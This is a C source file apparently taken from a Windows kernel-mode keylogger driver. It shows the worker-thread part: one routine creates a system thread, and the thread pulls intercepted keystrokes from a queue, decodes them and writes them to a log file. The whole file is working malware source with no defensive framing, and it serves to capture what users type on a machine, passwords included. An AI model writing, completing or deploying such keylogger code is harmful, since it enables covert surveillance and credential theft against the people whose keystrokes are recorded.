#include <ntddk.h>

#include "keylog.h"
#include "klogworker.h"
#include "keymap.h"

NTSTATUS 
InitializeKeylogWorker(
		IN PDEVICE_OBJECT DeviceObject
		) 

/*++

  Routine Description:
  
  	Initializes worker thread for keyboard device being hooked

  Arguments:
  
  	DeviceObject - Device object for the keyboard device the worker thread
		       will be servicing

  Return Value:
  
  	Returns status depending on if the worker thread was successfully initialized
	or not

--*/

{
	HANDLE thread; 
	NTSTATUS status;
	PKEYLOG_DEVICE_EXTENSION KeylogExtension;

	KeylogExtension = (PKEYLOG_DEVICE_EXTENSION)DeviceObject->DeviceExtension;
	KeylogExtension->ThreadTerminate = FALSE;

	status = PsCreateSystemThread(&thread,
			                (ACCESS_MASK)0, 
					NULL, 
					(HANDLE)0, 
			                NULL, 
					KeylogWorkerThread, 
			                KeylogExtension);

	if(!NT_SUCCESS(status)) {
		DbgPrint("[Keylog] Failed to create Worker Thread");
		return status;
	}

	ObReferenceObjectByHandle(thread,
			THREAD_ALL_ACCESS,
			NULL,
			KernelMode,
			(PVOID*)&KeylogExtension->ThreadObj, 
			NULL);

	ZwClose(thread);
	return status;
}

VOID 
KeylogWorkerThread(
		IN PKEYLOG_DEVICE_EXTENSION KeylogExtension
		) 

/*++

  Routine Description:
  
  	Keylogger worker thread reads from queue of intercepted keystrokes and
	decodes them as well as writes them to a file

  Arguments:
  
  	KeylogExtension - Pointer to keylogger device extension contains information
			  relevant to worker thread such as the file to write the
			  decoded keystrokes to

  Return Value:
  
  	VOID (no return)

--*/

{
	KEY_DATA* kData; 
	PDEVICE_OBJECT KeyboardDeviceObject = KeylogExtension->KeyboardDevice;
	PLIST_ENTRY ListEntry;

	while(TRUE) {

		//
		// Sleep if no data is available in the work queue for processing
		//

		KeWaitForSingleObject(&KeylogExtension->semQueue, 
				      Executive, 
				      KernelMode, 
				      FALSE, 
				      NULL);

		ListEntry = ExInterlockedRemoveHeadList(&KeylogExtension->QueueListHead,
				                         &KeylogExtension->lockQueue);

		//
		// If driver is being unloaded we need to exit
		//

		if(KeylogExtension->ThreadTerminate) {
			PsTerminateSystemThread(STATUS_SUCCESS);
		}

		kData = CONTAINING_RECORD(ListEntry, KEY_DATA, ListEntry);
		WriteKeystrokeToLog(KeylogExtension, kData);
	}
}
